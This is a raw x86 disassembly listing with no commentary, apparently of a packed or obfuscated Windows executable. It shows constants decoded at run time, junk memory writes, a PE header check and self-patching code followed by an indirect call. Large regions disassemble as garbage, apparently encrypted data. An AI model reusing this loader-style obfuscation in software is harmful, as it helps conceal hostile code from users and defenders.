  4060fc:	call   eax
  4060fe:	mov    ecx,DWORD PTR ds:0x4091a0
  406104:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40610a:	mov    DWORD PTR [ecx],eax
  40610c:	jmp    0x4063cb
  406111:	mov    eax,DWORD PTR [ebp-0x20]
  406114:	mov    ecx,DWORD PTR [ebp-0x74]
  406117:	xor    eax,esi
  406119:	add    eax,ebx
  40611b:	mov    edi,0xf89c85f5
  406120:	cmp    eax,ecx
  406122:	jne    0x406223
  406128:	mov    eax,DWORD PTR [ebp-0x20]
  40612b:	xor    eax,esi
  40612d:	add    eax,ebx
  40612f:	mov    ds:0x409224,eax
  406134:	mov    eax,DWORD PTR [ebp-0x20]
  406137:	xor    eax,esi
  406139:	add    eax,ebx
  40613b:	mov    ds:0x40921c,eax
  406140:	mov    eax,DWORD PTR [ebp-0x18]
  406143:	mov    DWORD PTR [ebp-0x8],eax
  406146:	mov    eax,DWORD PTR [ebp-0x20]
  406149:	mov    DWORD PTR [ebp+0xc],eax
  40614c:	mov    eax,DWORD PTR [ebp+0xc]
  40614f:	xor    eax,esi
  406151:	add    eax,ebx
  406153:	mov    DWORD PTR [ebp+0xc],eax
  406156:	mov    eax,ds:0x409020
  40615b:	mov    eax,DWORD PTR [eax]
  40615d:	mov    DWORD PTR [ebp+0xc],eax
  406160:	mov    eax,ds:0x409228
  406165:	mov    eax,DWORD PTR [eax]
  406167:	mov    DWORD PTR [ebp-0x60],eax
  40616a:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  406171:	mov    eax,DWORD PTR [ebp+0x10]
  406174:	xor    eax,esi
  406176:	add    eax,ebx
  406178:	mov    DWORD PTR [ebp+0x10],eax
  40617b:	mov    eax,ds:0x4091a0
  406180:	mov    DWORD PTR [ebp+0x10],eax
  406183:	mov    eax,DWORD PTR [ebp+0xc]
  406186:	mov    DWORD PTR [ebp+0x10],eax
  406189:	mov    eax,DWORD PTR [ebp+0x10]
  40618c:	push   0x4
  40618e:	pop    ecx
  40618f:	sub    ecx,eax
  406191:	add    ecx,DWORD PTR [ebp-0x60]
  406194:	mov    DWORD PTR [ebp-0x34],edi
  406197:	mov    DWORD PTR [ebp-0x10],ecx
  40619a:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  4061a4:	mov    eax,DWORD PTR [ebp+0x10]
  4061a7:	mov    DWORD PTR [ebp-0xc4],eax
  4061ad:	mov    eax,DWORD PTR [ebp-0x10]
  4061b0:	mov    DWORD PTR [ebp-0xc0],eax
  4061b6:	mov    eax,DWORD PTR [ebp-0x34]
  4061b9:	xor    eax,esi
  4061bb:	add    eax,ebx
  4061bd:	mov    DWORD PTR [ebp-0xbc],eax
  4061c3:	lea    eax,[ebp-0x80]
  4061c6:	mov    DWORD PTR [ebp-0xb8],eax
  4061cc:	mov    eax,DWORD PTR [ebp-0xc8]
  4061d2:	xor    eax,esi
  4061d4:	add    eax,ebx
  4061d6:	mov    DWORD PTR [ebp-0xc8],eax
  4061dc:	lea    eax,[ebp-0xc8]
  4061e2:	push   eax
  4061e3:	mov    eax,DWORD PTR [ebp-0x8]
  4061e6:	xor    eax,esi
  4061e8:	add    eax,ebx
  4061ea:	push   eax
  4061eb:	mov    eax,ds:0x4091c0
  4061f0:	push   0x409116
  4061f5:	push   DWORD PTR [eax]
  4061f7:	call   0x406f1d
  4061fc:	and    DWORD PTR [ebp+0xc],0x0
  406200:	mov    eax,DWORD PTR [ebp-0x10]
  406203:	sub    eax,DWORD PTR [ebp+0xc]
  406206:	push   eax
  406207:	mov    eax,DWORD PTR [ebp+0x10]
  40620a:	add    eax,DWORD PTR [ebp+0xc]
  40620d:	push   eax
  40620e:	call   0x40196f
  406213:	inc    DWORD PTR [ebp+0xc]
  406216:	cmp    DWORD PTR [ebp+0xc],0x52
  40621a:	jb     0x406200
  406220:	mov    eax,DWORD PTR [ebp-0x8]
  406223:	mov    eax,ds:0x4091a0
  406228:	mov    DWORD PTR [ebp+0x10],eax
  40622b:	mov    eax,ds:0x4092ac
  406230:	mov    DWORD PTR [ebp-0x68],eax
  406233:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  40623a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	xor    eax,esi
  406246:	add    eax,ebx
  406248:	mov    DWORD PTR [ebp-0x7c],eax
  40624b:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  406252:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40625c:	mov    DWORD PTR [ebp-0x78],edi
  40625f:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  406266:	mov    eax,DWORD PTR [ebp+0xc]
  406269:	xor    eax,esi
  40626b:	add    eax,ebx
  40626d:	mov    DWORD PTR [ebp-0x38],eax
  406270:	mov    DWORD PTR [ebp-0x48],0xf89c8530
  406277:	mov    BYTE PTR [ebp-0x29],0x57
  40627b:	mov    eax,DWORD PTR [ebp+0xc]
  40627e:	xor    eax,esi
  406280:	add    eax,ebx
  406282:	mov    DWORD PTR [ebp-0x38],eax
  406285:	mov    eax,DWORD PTR [ebp-0x64]
  406288:	xor    eax,esi
  40628a:	add    eax,ebx
  40628c:	push   eax
  40628d:	mov    eax,DWORD PTR [ebp-0x70]
  406290:	xor    eax,esi
  406292:	add    eax,ebx
  406294:	push   eax
  406295:	mov    eax,DWORD PTR [ebp-0x48]
  406298:	xor    eax,esi
  40629a:	add    eax,ebx
  40629c:	push   eax
  40629d:	lea    eax,[ebp-0x10c]
  4062a3:	push   eax
  4062a4:	push   DWORD PTR [ebp+0xc]
  4062a7:	push   DWORD PTR [ebp-0x4]
  4062aa:	call   0x40467f
  4062af:	test   eax,eax
  4062b1:	je     0x4062e2
  4062b7:	lea    eax,[ebp-0x10c]
  4062bd:	push   eax
  4062be:	mov    eax,DWORD PTR [ebp-0x4]
  4062c1:	xor    eax,esi
  4062c3:	add    eax,ebx
  4062c5:	push   eax
  4062c6:	mov    eax,DWORD PTR [ebp+0x10]
  4062c9:	add    eax,0xaa
  4062ce:	push   eax
  4062cf:	mov    eax,DWORD PTR [ebp+0x10]
  4062d2:	mov    eax,DWORD PTR [eax+0x198]
  4062d8:	push   DWORD PTR [eax]
  4062da:	call   0x406f1d
  4062df:	mov    DWORD PTR [ebp-0x24],eax
  4062e2:	cmp    DWORD PTR [ebp-0x24],0x0
  4062e6:	lea    edi,[ebp+0x4]
  4062e9:	mov    DWORD PTR [ebp-0x7c],edi
  4062ec:	je     0x4063b6
  4062f2:	lea    eax,[ebp-0x38]
  4062f5:	push   eax
  4062f6:	mov    eax,DWORD PTR [ebp-0x78]
  4062f9:	xor    eax,esi
  4062fb:	add    eax,ebx
  4062fd:	push   eax
  4062fe:	mov    eax,DWORD PTR [ebp-0x48]
  406301:	xor    eax,esi
  406303:	add    eax,ebx
  406305:	push   eax
  406306:	push   DWORD PTR [ebp-0x24]
  406309:	lea    eax,[ebp-0x10c]
  40630f:	push   eax
  406310:	push   DWORD PTR [ebp+0xc]
  406313:	push   DWORD PTR [ebp-0x4]
  406316:	call   0x404cef
  40631b:	test   eax,eax
  40631d:	je     0x40634b
  406323:	lea    eax,[ebp-0x10c]
  406329:	push   eax
  40632a:	mov    eax,DWORD PTR [ebp-0x4]
  40632d:	xor    eax,esi
  40632f:	add    eax,ebx
  406331:	push   eax
  406332:	mov    eax,DWORD PTR [ebp+0x10]
  406335:	add    eax,0xee
  40633a:	push   eax
  40633b:	mov    eax,DWORD PTR [ebp+0x10]
  40633e:	mov    eax,DWORD PTR [eax+0x198]
  406344:	push   DWORD PTR [eax]
  406346:	call   0x406f1d
  40634b:	mov    ecx,DWORD PTR [ebp-0x48]
  40634e:	xor    ecx,esi
  406350:	mov    eax,0xffcd8d62
  406355:	sub    eax,ecx
  406357:	sub    eax,DWORD PTR [ebp-0x24]
  40635a:	mov    ecx,DWORD PTR [ebp-0x68]
  40635d:	add    ecx,eax
  40635f:	mov    eax,DWORD PTR [ebp-0x24]
  406362:	mov    DWORD PTR [eax+0x1],ecx
  406365:	mov    al,BYTE PTR [ebp-0x29]
  406368:	mov    ecx,DWORD PTR [ebp-0x24]
  40636b:	xor    al,0x49
  40636d:	sub    al,0x35
  40636f:	mov    BYTE PTR [ecx],al
  406371:	lea    eax,[ebp-0x24]
  406374:	inc    BYTE PTR [eax]
  406376:	inc    eax
  406377:	push   eax
  406378:	pop    ecx
  406379:	dec    ecx
  40637a:	xchg   ecx,edx
  40637c:	dec    BYTE PTR [edx]
  40637e:	push   DWORD PTR [ebp+0x10]
  406381:	mov    eax,ds:0x40925c
  406386:	mov    eax,DWORD PTR [eax]
  406388:	push   DWORD PTR [eax]
  40638a:	lea    eax,ds:0x409278
  406390:	push   DWORD PTR [eax]
  406392:	lea    eax,ds:0x409024
  406398:	push   DWORD PTR [eax]
  40639a:	lea    eax,ds:0x409258
  4063a0:	push   DWORD PTR [eax]
  4063a2:	lea    eax,ds:0x409390
  4063a8:	push   DWORD PTR [eax]
  4063aa:	xchg   ebx,edx
  4063ac:	inc    ebx
  4063ad:	inc    ebx
  4063ae:	sub    ebx,0x3
  4063b1:	push   ebx
  4063b2:	pop    eax
  4063b3:	call   DWORD PTR [eax+0x1]
  4063b6:	mov    DWORD PTR [ebp-0x6c],edi
  4063b9:	mov    eax,DWORD PTR [ebp-0x3c]
  4063bc:	mov    eax,DWORD PTR [ebp-0x18]
  4063bf:	push   DWORD PTR [ebp-0x20]
  4063c2:	lea    eax,[ebp-0x6c]
  4063c5:	push   eax
  4063c6:	call   0x4034f6
  4063cb:	mov    eax,ds:0x4091a0
  4063d0:	push   0x4
  4063d2:	add    eax,0x1cc
  4063d7:	push   eax
  4063d8:	lea    eax,[ebp-0x3c]
  4063db:	push   eax
  4063dc:	call   0x402c87
  4063e1:	mov    eax,DWORD PTR [ebp-0x3c]
  4063e4:	mov    eax,DWORD PTR [eax]
  4063e6:	pop    edi
  4063e7:	pop    esi
  4063e8:	pop    ebx
  4063e9:	leave  
  4063ea:	ret    0xc
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x20
  4063f3:	leave  
  4063f4:	ret    0x4
  4063f7:	push   ebp
  4063f8:	mov    ebp,esp
  4063fa:	push   ecx
  4063fb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406402:	sub    eax,DWORD PTR ds:0x4292d9
  406408:	mov    eax,DWORD PTR [ebp+0x8]
  40640b:	or     DWORD PTR ds:0x42759c,0x4292bd
  406415:	mov    al,BYTE PTR [eax]
  406417:	add    al,0x35
  406419:	and    DWORD PTR ds:0x427cf7,0x42c89e
  406423:	xor    al,0x49
  406425:	mov    DWORD PTR ds:0x4292a9,0x8ce
  40642f:	cmp    al,0xcb
  406431:	mov    DWORD PTR ds:0x4292d5,0x323c
  40643b:	jne    0x4064e2
  406441:	and    DWORD PTR ds:0x4292c1,0x0
  40644b:	xor    ecx,ecx
  40644d:	or     ecx,DWORD PTR ds:0x4292c1
  406453:	inc    ecx
  406454:	mov    DWORD PTR ds:0x4292c1,ecx
  40645a:	cmp    DWORD PTR ds:0x4292c1,0xa
  406461:	jne    0x40647a
  406467:	push   DWORD PTR [ebp-0x18]
  40646a:	push   0x641f
  40646f:	push   0x4275a8
  406474:	call   DWORD PTR ds:0x427ac3
  40647a:	cmp    DWORD PTR ds:0x4292c1,0x9
  406481:	jne    0x406496
  406487:	xor    ecx,ecx
  406489:	or     ecx,DWORD PTR ds:0x4292c1
  40648f:	inc    ecx
  406490:	mov    DWORD PTR ds:0x4292c1,ecx
  406496:	cmp    DWORD PTR ds:0x4292c1,0x1d
  40649d:	jb     0x40644b
  4064a3:	mov    eax,DWORD PTR [ebp+0x8]
  4064a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4064a9:	add    ecx,DWORD PTR [eax+0x3c]
  4064ac:	mov    edx,0x7510857
  4064b1:	mov    DWORD PTR [ebp+0x8],ecx
  4064b4:	mov    eax,DWORD PTR [ebp-0x4]
  4064b7:	xor    eax,edx
  4064b9:	push   esi
  4064ba:	mov    esi,DWORD PTR [ebp+0x8]
  4064bd:	mov    ecx,0x32729e
  4064c2:	add    eax,ecx
  4064c4:	cmp    DWORD PTR [esi+0x54],eax
  4064c7:	pop    esi
  4064c8:	je     0x4064d6
  4064ce:	mov    eax,DWORD PTR [ebp+0x8]
  4064d1:	jmp    0x4064ef
  4064d6:	mov    eax,DWORD PTR [ebp-0x4]
  4064d9:	xor    eax,edx
  4064db:	add    eax,ecx
  4064dd:	jmp    0x4064ef
  4064e2:	mov    eax,DWORD PTR [ebp-0x4]
  4064e5:	xor    eax,0x7510857
  4064ea:	add    eax,0x32729e
  4064ef:	leave  
  4064f0:	ret    0x4
  4064f3:	push   ebp
  4064f4:	mov    ebp,esp
  4064f6:	push   ecx
  4064f7:	push   ecx
  4064f8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4064ff:	xor    DWORD PTR ds:0x427d1b,0x4292a5
  406509:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406510:	mov    eax,DWORD PTR [ebp-0x4]
  406513:	push   esi
  406514:	mov    esi,DWORD PTR [ebp-0x8]
  406517:	xor    DWORD PTR ds:0x427d03,0x39
  406521:	jmp    0x40669a
  406526:	mov    al,cs:0xfbf5fbf3
  40652c:	data16 jge 0x40659b
  40652f:	inc    ecx
  406530:	xor    eax,0xccf1755e
  406535:	loope  0x4065b6
  406537:	sub    DWORD PTR [esp+edi*2-0x28],edi
  40653b:	jg     0x4065b9
  40653d:	jl     0x40656b
  40653f:	inc    ebp
  406540:	(bad)  
  406542:	inc    ebx
  406543:	and    BYTE PTR [eax+ecx*4],al
  406546:	sub    BYTE PTR [edx],al
  406548:	pop    ebp
  406549:	clc    
  40654a:	adc    edx,DWORD PTR [ebp+edx*4+0x297c0568]
  406551:	arpl   WORD PTR [esi],bp
  406553:	push   ecx
  406554:	jo     0x406569
  406556:	and    al,0xf4
  406558:	push   ds
  406559:	lock pop ebx
  40655b:	and    esi,edi
  40655d:	lods   eax,DWORD PTR ds:[esi]
  40655e:	das    
  40655f:	ja     0x40655b
  406561:	push   ebx
  406562:	mov    dl,0x8f
  406564:	mov    ecx,edx
  406566:	inc    edx
  406567:	xchg   BYTE PTR [ebx-0x3aade980],bh
  40656d:	push   0x8b46b1d9
  406572:	sub    al,0x50
  406574:	cmp    BYTE PTR [eax+0x3a],0x5d
  406578:	jp     0x4065c5
  40657a:	lds    edx,FWORD PTR [esi]
  40657c:	(bad)  
  40657d:	cs data16 icebp 
  406580:	xor    BYTE PTR fs:[edx+0x1d],bh
  406584:	sbb    ebp,DWORD PTR [ecx-0x29dbf05f]
  40658a:	fld    DWORD PTR [eax+0x723253e4]
  406590:	jge    0x40659d
  406592:	es cld 
  406594:	into   
  406595:	jp     0x40651e
  406597:	pop    esi
  406598:	or     eax,0x6e4a1740
  40659d:	(bad)  
  40659e:	sub    BYTE PTR [ebp+0x2b],al
  4065a1:	xor    eax,0x5b1dc137
  4065a6:	pop    ecx
  4065a7:	adc    BYTE PTR [edx+0x77],al
  4065aa:	mov    eax,0x9d8176bb
  4065af:	(bad)  
  4065b0:	out    dx,al
  4065b1:	scas   al,BYTE PTR es:[edi]
  4065b2:	mov    edi,0xc3179308
  4065b7:	ds push ds
  4065b9:	ss (bad) 
  4065bc:	mov    ah,bl
  4065be:	and    eax,0x708613f0
  4065c3:	add    DWORD PTR [edi+0x367754a],eax
  4065c9:	inc    DWORD PTR [ecx-0x11b920ec]
  4065cf:	in     eax,dx
  4065d0:	jae    0x4065a1
  4065d2:	xchg   ebx,eax
  4065d3:	data16 xchg BYTE PTR [eax-0x2a],cl
  4065d7:	scas   eax,DWORD PTR es:[edi]
  4065d8:	pop    ss
  4065d9:	adc    ebp,DWORD PTR [ebx]
  4065db:	iret   
  4065dc:	enter  0x5d4f,0xf0
  4065e0:	sti    
  4065e1:	push   ebx
  4065e2:	inc    esp
  4065e3:	xchg   ebx,eax
  4065e4:	(bad)  
  4065e5:	aad    0x88
  4065e7:	xchg   esi,eax
  4065e8:	mov    cs,WORD PTR [edx]
  4065ea:	ins    BYTE PTR es:[edi],dx
  4065eb:	addr16 pop ebx
  4065ed:	pop    eax
  4065ee:	jns    0x4065fb
  4065f0:	jge    0x4065ed
  4065f2:	scas   eax,DWORD PTR es:[edi]
  4065f3:	pop    ecx
  4065f4:	push   0xf6307175
  4065f9:	pop    es
  4065fa:	mov    ch,0x58
  4065fc:	add    eax,0x17488fa7
  406601:	pop    edx
  406602:	mov    bh,dl
  406604:	imul   ebp,DWORD PTR [esi+esi*8+0x54],0xfa6efb94
  40660c:	mov    eax,ds:0xec490873
  406611:	adc    esi,DWORD PTR [esi]
  406613:	mov    bh,0xb
  406615:	in     eax,0xf4
  406617:	je     0x406656
  406619:	jecxz  0x406696
  40661b:	add    DWORD PTR [ecx-0x53ccd6e1],edi
  406621:	popa   
  406622:	jbe    0x4065cb
  406624:	xchg   esp,eax
  406625:	push   ss
  406626:	int    0x52
  406628:	(bad)  
  40662a:	inc    edi
  40662b:	xchg   ebx,eax
  40662c:	mov    bh,0xc3
  40662e:	rcr    DWORD PTR [edx+0x2b4cfc3a],cl
  406634:	dec    ebx
  406635:	cwde   
  406636:	jl     0x406677
  406638:	cmp    ebx,ebx
  40663a:	iret   
  40663b:	inc    esp
  40663c:	mov    edx,0x505823f8
  406641:	dec    esp
  406642:	ss pop esi
  406644:	add    ch,BYTE PTR [eax+0x75cf453c]
  40664a:	stc    
  40664b:	scas   eax,DWORD PTR es:[edi]
  40664c:	int    0xa7
  40664e:	dec    esp
  40664f:	xor    BYTE PTR [ebx+0x24],ch
  406652:	sub    eax,0x8476fda
  406657:	fdivr  DWORD PTR [ebx-0x11bb7543]
  40665d:	push   es
  40665e:	test   esi,ebx
  406660:	aas    
  406661:	loop   0x406655
  406663:	and    BYTE PTR [ebx+0x290a5a0],0xf
  40666a:	jecxz  0x406633
  40666c:	lods   al,BYTE PTR ds:[esi]
  40666d:	ins    BYTE PTR es:[edi],dx
  40666e:	(bad)  
  40666f:	cld    
  406670:	jb     0x4066dc
  406672:	fcomi  st,st(3)
  406674:	pop    ebx
  406675:	scas   eax,DWORD PTR es:[edi]
  406676:	pop    ds
  406677:	pop    ebx
  406678:	jge    0x4066d9
  40667a:	jb     0x4066fa
  40667c:	(bad)  
  40667d:	jne    0x4066c1
  40667f:	sub    edx,eax
  406681:	sub    BYTE PTR [edx+0x4f637650],0xde
  406688:	mov    ebx,0xffebf69f
  40668d:	leave  
  40668e:	push   esi
  40668f:	scas   eax,DWORD PTR es:[edi]
  406690:	adc    al,0x3c
  406692:	push   esi
  406693:	mov    ds:0x4e131a1,eax
  406698:	cmp    eax,0x857bac2
  40669d:	push   ecx
  40669e:	pop    es
  40669f:	xor    eax,edx
  4066a1:	adc    DWORD PTR ds:0x4292a5,0x7cf1
  4066ab:	xor    esi,edx
  4066ad:	mov    ecx,0x32729e
  4066b2:	sbb    DWORD PTR ds:0x42c89a,0x427594
  4066bc:	add    esi,ecx
  4066be:	or     DWORD PTR ds:0x42c892,0x2710
  4066c8:	add    eax,ecx
  4066ca:	sbb    DWORD PTR ds:0x4292b5,0x4275ac
  4066d4:	imul   eax,esi
  4066d7:	mov    DWORD PTR ds:0x42c896,0x5e2a
  4066e1:	mov    esi,DWORD PTR [ebp+0xc]
  4066e4:	mov    DWORD PTR ds:0x427d03,0x704c
  4066ee:	cmp    esi,eax
  4066f0:	mov    DWORD PTR ds:0x427d1f,0x38e6
  4066fa:	jne    0x4068f9
  406700:	mov    DWORD PTR ds:0x4275b0,0x11
  40670a:	cmp    DWORD PTR ds:0x4275b0,0x0
  406711:	je     0x40675a
  406717:	cmp    DWORD PTR ds:0x4275b0,0x1b
  40671e:	jne    0x406746
  406724:	push   DWORD PTR [ebp-0x28]
  406727:	push   0x3cc8
  40672c:	push   0x5307
  406731:	push   0x1b9a
  406736:	push   0x3e4a
  40673b:	push   0x4274
  406740:	call   DWORD PTR ds:0x427c6b
  406746:	xor    esi,esi
  406748:	or     esi,DWORD PTR ds:0x4275b0
  40674e:	dec    esi
  40674f:	mov    DWORD PTR ds:0x4275b0,esi
  406755:	jmp    0x40670a
  40675a:	mov    eax,DWORD PTR [ebp-0x4]
  40675d:	xor    esi,esi
  40675f:	xor    esi,DWORD PTR ds:0x42c8de
  406765:	mov    esi,DWORD PTR [esi]
  406767:	adc    DWORD PTR ds:0x4292d5,esi
  40676d:	mov    esi,DWORD PTR [ebp-0x8]
  406770:	xor    eax,edx
  406772:	xor    esi,edx
  406774:	add    eax,ecx
  406776:	add    esi,ecx
  406778:	jmp    0x4068f1
  40677d:	dec    eax
  40677e:	cmp    al,0x31
  406780:	and    ecx,DWORD PTR [ebp+0x25]
  406783:	jp     0x4067ec
  406785:	pop    edx
  406786:	inc    esp
  406787:	push   cs
  406788:	and    eax,0x6ad088cc
  40678d:	fld    TBYTE PTR [eax]
  40678f:	jl     0x40680d
  406791:	fdivr  DWORD PTR [edi+0x7c]
  406794:	jl     0x406774
  406796:	cwde   
  406797:	sbb    bl,BYTE PTR [esi]
  406799:	sub    al,0xdd
  40679b:	xchg   ebp,eax
  40679c:	and    al,0xb6
  40679e:	or     edx,0x8491e0f
  4067a4:	adc    ebp,DWORD PTR [edx-0x1b9627ff]
  4067aa:	shl    ebx,1
  4067ac:	jae    0x406736
  4067ae:	push   edx
  4067af:	lahf   
  4067b0:	imul   BYTE PTR [edi+edx*4]
  4067b3:	das    
  4067b4:	or     dl,ah
  4067b6:	adc    eax,ebx
  4067b8:	add    DWORD PTR [esi-0x4e4a7eec],ebp
  4067be:	push   ss
  4067bf:	xchg   esi,eax
  4067c0:	ins    BYTE PTR es:[edi],dx
  4067c1:	inc    ecx
  4067c2:	(bad)  
  4067c4:	ins    BYTE PTR es:[edi],dx
  4067c5:	ror    BYTE PTR [si],cl
  4067c8:	jg     0x4067aa
  4067ca:	jecxz  0x4067ce
  4067cc:	es xchg edi,eax
  4067ce:	pop    ebp
  4067cf:	adc    dh,BYTE PTR [edi-0x63ed9ca0]
  4067d5:	imul   DWORD PTR [edi+0x4c]
  4067d8:	rol    BYTE PTR ds:0xad501cae,cl
  4067de:	pop    DWORD PTR [edi-0x73a5f08d]
  4067e4:	xchg   esi,eax
  4067e5:	fsub   DWORD PTR [edx+0x612525f0]
  4067eb:	inc    edx
  4067ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ed:	mov    al,ds:0x439446cb
  4067f2:	test   ch,bl
  4067f4:	aas    
  4067f5:	dec    ebx
  4067f6:	adc    BYTE PTR [edx-0x7af6550a],ch
  4067fc:	outs   dx,DWORD PTR ds:[esi]
  4067fd:	dec    esi
  4067fe:	mov    dh,0x75
  406800:	pusha  
  406801:	adc    eax,0xce27c373
  406806:	adc    DWORD PTR [edx+0x3aa2f645],ebx
  40680c:	inc    esp
  40680d:	mov    ecx,0xa9bc84f0
  406812:	loop   0x406814
  406814:	fdivr  DWORD PTR [ecx+0xa]
  406817:	jmp    0x4067bf
  406819:	inc    esi
  40681a:	nop
  40681b:	(bad)  
  40681c:	or     BYTE PTR [edx+esi*4+0x1afd1ad0],bl
  406823:	in     eax,0x3f
  406825:	aam    0x2e
  406827:	fwait
  406828:	scas   eax,DWORD PTR es:[edi]
  406829:	out    0x47,eax
  40682b:	outs   dx,DWORD PTR ds:[esi]
  40682c:	or     BYTE PTR [ebx-0x37],0x21
  406830:	pop    edi
  406831:	sbb    DWORD PTR [ecx-0x15ae3c9],edx
  406837:	mov    dh,0x9a
  406839:	mov    edx,?
  40683b:	scas   al,BYTE PTR es:[edi]
  40683c:	scas   eax,DWORD PTR es:[edi]
  40683d:	loop   0x406837
  40683f:	enter  0xdcf1,0xca
  406843:	mov    ah,BYTE PTR [edi-0x259b9a40]
  406849:	sbb    esp,0xffffffb7
  40684c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684d:	cmc    
  40684e:	push   0x364f026c
  406853:	out    dx,eax
  406854:	test   ecx,ebx
  406856:	dec    ecx
  406857:	mov    ch,0x28
  406859:	mov    cl,0xf4
  40685b:	xor    ah,bh
  40685d:	push   esi
  40685e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40685f:	cmp    DWORD PTR [esi+0x353c0b97],ebp
  406865:	xchg   ebp,eax
  406866:	pop    edi
  406867:	adc    DWORD PTR [esi+0x52530bea],0x53
  40686e:	repz das 
  406870:	ror    BYTE PTR [edi-0x3b],0xda
  406874:	daa    
  406875:	fwait
  406876:	jecxz  0x40681c
  406878:	sahf   
  406879:	fistp  DWORD PTR [ebx+0x76]
  40687c:	dec    eax
  40687d:	cmp    BYTE PTR [eax+0x3],dl
  406880:	aas    
  406881:	repz dec eax
  406883:	(bad)  
  406884:	adc    edx,DWORD PTR [edi-0x35752ba]
  40688a:	loop   0x4068cc
  40688c:	test   BYTE PTR [edx+0x5b],ah
  40688f:	inc    ebp
  406890:	out    0x64,eax
  406892:	js     0x406815
  406894:	dec    esp
  406895:	mov    dl,0x9e
  406897:	arpl   WORD PTR ds:0x7ca56363,ax
  40689d:	enter  0xaed,0xd7
  4068a1:	inc    esp
  4068a2:	adc    dh,BYTE PTR ss:[edx]
  4068a5:	jl     0x40688b
  4068a7:	jg     0x406848
  4068a9:	fistp  WORD PTR [edi]
  4068ab:	or     eax,0xb328b83d
  4068b0:	pop    ds
  4068b1:	jp     0x4068f8
  4068b3:	xor    al,0x44
  4068b5:	shr    bh,1
  4068b7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4068b9:	mov    ah,0x93
  4068bb:	jge    0x4068ef
  4068bd:	jmp    0x40690f
  4068bf:	and    al,0x55
  4068c1:	call   DWORD PTR cs:[ebx-0x23]
  4068c5:	mov    al,0x36
  4068c7:	sbb    BYTE PTR [edi+0x7d061baf],ch
  4068cd:	sbb    eax,0x2ab6e1c3
  4068d2:	fld    QWORD PTR [edi+esi*4-0x56995f49]
  4068d9:	xchg   ecx,eax
  4068da:	repz and al,0x39
  4068dd:	shl    BYTE PTR [edx+0x50],cl
  4068e0:	add    edx,DWORD PTR [ecx+0x2e]
  4068e3:	les    ebx,FWORD PTR ds:0xf37dcd65
  4068e9:	scas   eax,DWORD PTR es:[edi]
  4068ea:	inc    ebx
  4068eb:	out    0xac,eax
  4068ed:	xor    BYTE PTR [edi],bl
  4068ef:	retf   0xf0b
  4068f2:	scas   eax,DWORD PTR es:[edi]
  4068f3:	(bad)  
  4068f4:	jmp    0x406f18
  4068f9:	mov    eax,DWORD PTR [ebp+0xc]
  4068fc:	jmp    0x406a75
  406901:	mov    eax,0x65210ec9
  406906:	stc    
  406907:	mov    ebx,0x4f39e44d
  40690c:	pop    ebp
  40690d:	jecxz  0x40694a
  40690f:	pop    edx
  406910:	jns    0x4068b9
  406912:	sub    edi,DWORD PTR [esp+edi*2-0x28]
  406916:	jg     0x406994
  406918:	jl     0x406901
  40691a:	mov    ah,0x7e
  40691c:	es jmp 0xf5b3eb84
  406922:	mov    ecx,0xe7d00edb
  406927:	xor    BYTE PTR [edi+0x198bdb25],dl
  40692d:	sahf   
  40692e:	(bad)  
  40692f:	int3   
  406930:	mov    ebx,0xbce87b46
  406935:	jae    0x4068c1
  406937:	mov    ch,0x93
  406939:	xchg   edi,eax
  40693a:	div    DWORD PTR [ebx]
  40693c:	(bad)  
  40693d:	pushf  
  40693e:	aad    0x92
  406940:	inc    esi
  406941:	or     ecx,esi
  406943:	adc    BYTE PTR [esi+ebx*4-0x17],ah
  406947:	cmp    al,0xe5
  406949:	inc    eax
  40694a:	nop
  40694b:	sub    ebx,DWORD PTR [eax+ecx*4-0x259e1303]
  406952:	pop    esp
  406953:	push   ebx
  406954:	lea    eax,[esi]
  406956:	inc    ebx
  406957:	call   0xb280b47f
  40695c:	shr    BYTE PTR [eax+eax*4],0xfe
  406960:	jge    0x406918
  406962:	jp     0x406942
  406964:	mov    esp,0xee6d450d
  406969:	pop    ebx
  40696a:	scas   eax,DWORD PTR es:[edi]
  40696b:	push   ebx
  40696c:	fst    QWORD PTR [eax+0x1b8a3c3f]
  406972:	leave  
  406973:	dec    ebp
  406974:	adc    BYTE PTR [ecx],cl
  406976:	jmp    0x394:0xe0e672d8
  40697d:	cmp    cl,BYTE PTR [eax]
  40697f:	jae    0x406941
  406981:	sbb    DWORD PTR [ebp+0x38],ebx
  406984:	mov    ch,0x19
  406986:	jb     0x4069d8
  406988:	mov    ebx,0x1a5cb606
  40698d:	clc    
  40698e:	xchg   ebp,eax
  40698f:	scas   al,BYTE PTR es:[edi]
  406990:	xlat   BYTE PTR gs:[ebx]
  406992:	scas   al,BYTE PTR es:[edi]
  406993:	xor    bl,bh
  406995:	sub    BYTE PTR [edi+0x4a],ah
  406998:	mov    ch,0xf9
  40699a:	aas    
  40699b:	ret    
  40699c:	push   esi
  40699d:	cld    
  40699e:	out    dx,eax
  40699f:	in     al,dx
  4069a0:	mov    BYTE PTR [edx+0x4cb6c92e],dl
  4069a6:	mov    bl,0xfb
  4069a8:	or     eax,0x99548625
  4069ad:	xor    edi,edx
  4069af:	aas    
  4069b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b1:	ror    ah,1
  4069b3:	lock out dx,eax
  4069b5:	dec    esp
  4069b6:	xchg   ebp,eax
  4069b7:	shl    BYTE PTR [ecx+0x42ec73c7],cl
  4069bd:	pop    esp
  4069be:	ret    
  4069bf:	push   0x976b34c2
  4069c4:	scas   ax,WORD PTR es:[edi]
  4069c6:	aam    0xb4
  4069c8:	ins    DWORD PTR es:[edi],dx
  4069c9:	mov    esi,ecx
